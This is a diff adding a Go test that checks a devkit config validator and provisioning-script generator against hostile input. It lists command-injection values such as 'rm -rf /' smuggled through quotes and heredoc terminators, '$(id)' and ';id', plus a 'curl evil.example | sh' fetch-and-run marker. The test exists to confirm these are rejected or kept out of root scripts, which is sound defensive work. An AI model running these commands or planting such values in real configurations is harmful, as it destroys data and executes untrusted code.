@@ -204,3 +204,57 @@ func TestUserScript(t *testing.T) {
 		t.Errorf("mount mode should symlink the mount: %s", s)
 	}
 }
+
+// Adversarial: a hostile devkit.yaml tries to reach root through the
+// provisioning scripts. Validation is the gate; this checks both that the
+// gate holds and that nothing user-controlled is rendered unquoted.
+func TestHostileConfigCannotReachRoot(t *testing.T) {
+	attacks := []string{
+		`22"; rm -rf /; echo "`,
+		"22\nEOF\nrm -rf /\ncat <<'EOF'",
+		"$(id)", "`id`", "${HOME}", "22 && id", "22;id", "22|id", "22 ", " 22",
+	}
+	for _, a := range attacks {
+		c := project.Default()
+		c.Name = "x"
+		c.Tools.Manager = project.ManagerMise
+		c.Tools.Versions = map[string]string{"node": a}
+		if err := c.Validate(); err == nil {
+			t.Errorf("version %q should be rejected", a)
+		}
+		c.Tools.Versions = map[string]string{a: "22"}
+		if err := c.Validate(); err == nil {
+			t.Errorf("tool name %q should be rejected", a)
+		}
+		c.Tools.Versions = nil
+		c.Tools.Packages = []string{a}
+		if err := c.Validate(); err == nil {
+			t.Errorf("package %q should be rejected", a)
+		}
+	}
+
+	// install: is free-form on purpose. It must run as the sandbox user and
+	// never appear in either provisioning script, which run as root or at
+	// boot before the firewall.
+	marker := "curl evil.example | sh"
+	sys, _ := System(params(func(c *project.Config) { c.Install = marker }))
+	usr, _ := User(params(func(c *project.Config) { c.Install = marker }))
+	if strings.Contains(sys, marker) || strings.Contains(usr, marker) {
+		t.Error("install: must not be rendered into provisioning scripts")
+	}
+
+	// Values that pass validation land in the user config as exactly one
+	// TOML line each, inside a quoted heredoc.
+	usr, _ = User(params(func(c *project.Config) {
+		c.Tools.Versions = map[string]string{"node": "22", "ruby": "3.3.6", "rust": "nightly-2026-01-01"}
+	}))
+	body := usr[strings.Index(usr, "[tools]"):]
+	body = body[:strings.Index(body, "\nEOF")]
+	want := "[tools]\nnode = \"22\"\nruby = \"3.3.6\"\nrust = \"nightly-2026-01-01\""
+	if body != want {
+		t.Errorf("tools block = %q, want %q", body, want)
+	}
+	if strings.Count(usr, "\nEOF\n") != 1 {
+		t.Errorf("exactly one heredoc terminator expected in the user script:\n%s", usr)
+	}
+}
